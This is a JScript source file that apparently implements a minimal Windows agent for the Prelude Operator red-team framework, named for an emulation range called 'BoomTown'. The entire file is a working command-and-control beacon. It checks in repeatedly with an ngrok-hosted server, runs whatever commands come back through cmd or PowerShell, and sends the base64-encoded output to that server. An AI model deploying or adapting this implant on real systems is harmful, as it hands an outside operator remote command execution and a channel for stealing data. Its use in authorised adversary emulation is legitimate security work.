// cscript.exe checkin_minimalist.js

// Create Unique ID

/*

If you wanted to create a unique GUID Each run.


var TypeLib = new ActiveXObject("Scriptlet.TypeLib");
var guid = (TypeLib.Guid).replace('{', '').replace('}', '');
var myGuid = guid.substring(1,guid.length-2);
WScript.Echo(myGuid);


WScript.StdIn.ReadLine();

*/
var myGuid = "4D44BF0-C0D0-4D21-9694-8C8BB885B6E4";

//TODO: Add Range variable, etc...

// Create Base64 Object, supports encode, decode 
	var Base64={characters:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(a){Base64.characters;var r="",c=0;do{var e=a.charCodeAt(c++),t=a.charCodeAt(c++),h=a.charCodeAt(c++),s=(e=e||0)>>2&63,A=(3&e)<<4|(t=t||0)>>4&15,o=(15&t)<<2|(h=h||0)>>6&3,B=63&h;t?h||(B=64):o=B=64,r+=Base64.characters.charAt(s)+Base64.characters.charAt(A)+Base64.characters.charAt(o)+Base64.characters.charAt(B)}while(c<a.length);return r}};
// We'll base64 endode /decode stdout to stay sane. :)

var prelude_operator_server = 'https://boomtown.ngrok.io';
var JSONCheckin =  '{"Name":"'+myGuid+'","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["pwsh","cmd"],"Range":"BoomTown","Pwd":"","Sleep":10,"Executing":"","Links":[]}'

function sleep_for(count)  // TODO Align with JSON Sleep:
{
	for (i=1; i<=count; i++)
	{
		WScript.Sleep(1000)
		WScript.Echo("I started",i,"second(s) ago.")
	}
}

function postText(strURL, json_data)
{
    var strResult;

    try
    {
        // Create the WinHTTPRequest ActiveX Object.
        var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");

        //  Create an HTTP request. 
        var temp = WinHttpReq.Open("POST", strURL, false);  

        //  Send the HTTP request.
        WinHttpReq.Send(json_data);

        //  Retrieve the response text.
        strResult = WinHttpReq.ResponseText;
    }
    catch (objError)
    {
        strResult = objError + "\n"
        strResult += "WinHTTP returned error: " + 
            (objError.number & 0xFFFF).toString() + "\n\n";
        strResult += objError.description;
    }

    //  Return the response text.
    return strResult;
}

function parse_Execute(task)
{
	
	// classic WSH JScript version - So I can avoid loading some JScript parser. We'll use this hack to get to it.
	var htmlfile = new ActiveXObject('htmlfile'), JSON;
	htmlfile.write('<meta http-equiv="x-ua-compatible" content="IE=9" />');
	htmlfile.close(JSON = htmlfile.parentWindow.JSON);
	var jsonData = (JSON.parse(task));
	
	
	
	
	var c = "";
	var id_task = "";
	var operation = "";
	var executor = "";
	
	for (var i = 0; i < jsonData.links.length; i++) {
		var counter = jsonData.links[i];
		WScript.Echo(counter.ID); //
		WScript.Echo(counter.Request); //
		c = counter.Request;
		id_task = counter.ID;
		operation = counter.operation;
		executor = counter.Executor;
	}
	
	/* debug output
	WScript.StdOut.WriteLine(executor);
	WScript.StdIn.ReadLine();
	*/
	
	// Setup Execution Env;
	
	var JSONResponse = "";
	var so = ""; //Collect STDOUT;
	var so_b64 = ""; //Base64 Encoded STDOUT;
	
	
	switch(executor)
	{
		case "cmd":
			var r = new ActiveXObject("WScript.Shell").Exec(c);
			while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
			so_b64 = Base64.encode(so); //base64 encode stdout.
			JSONResponse = '{"Name":"'+myGuid+'","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["pwsh","cmd"],"Range":"BoomTown","Pwd":"","Sleep":10,"Executing":"","Links":[{"ID":"'+id_task+'","Executor":"cmd","Payload":"","Request":"'+c+'","Response":"'+so_b64+'","Status":"0","operation": "'+operation+'","Pid":"'+r.ProcessID+'"}]}';
			break;
			
		case "pwsh":
			var r = new ActiveXObject("WScript.Shell").Exec("powershell.exe " + c);
			while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
			so_b64 = Base64.encode(so); //base64 encode stdout.
			JSONResponse = '{"Name":"'+myGuid+'","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["pwsh","cmd"],"Range":"BoomTown","Pwd":"","Sleep":10,"Executing":"","Links":[{"ID":"'+id_task+'","Executor":"pwsh","Payload":"","Request":"'+c+'","Response":"'+so_b64+'","Status":"0","operation": "'+operation+'","Pid":"'+r.ProcessID+'"}]}';
			break;
		
			
	}
	/* debugger
	WScript.StdOut.WriteLine(JSONResponse);
	WScript.StdIn.ReadLine();
	*/
	
	postText(prelude_operator_server, JSONResponse);
}


while(true)
	{
		WScript.Echo(postText(prelude_operator_server, JSONCheckin));
		var checkin_Response = postText(prelude_operator_server, JSONCheckin);

		if(checkin_Response.length < 1) {
			WScript.Echo("Nothing to See Here");
			sleep_for(10);
			
		}
		else {
			
			parse_Execute(checkin_Response);
			sleep_for(10);
	
		}
		

}


/*
References:

Example if your agent is behind a proxy.
https://docs.microsoft.com/en-us/windows/win32/winhttp/iwinhttprequest-setproxy#examples
https://docs.microsoft.com/en-us/windows/win32/winhttp/iwinhttprequest-send

*/
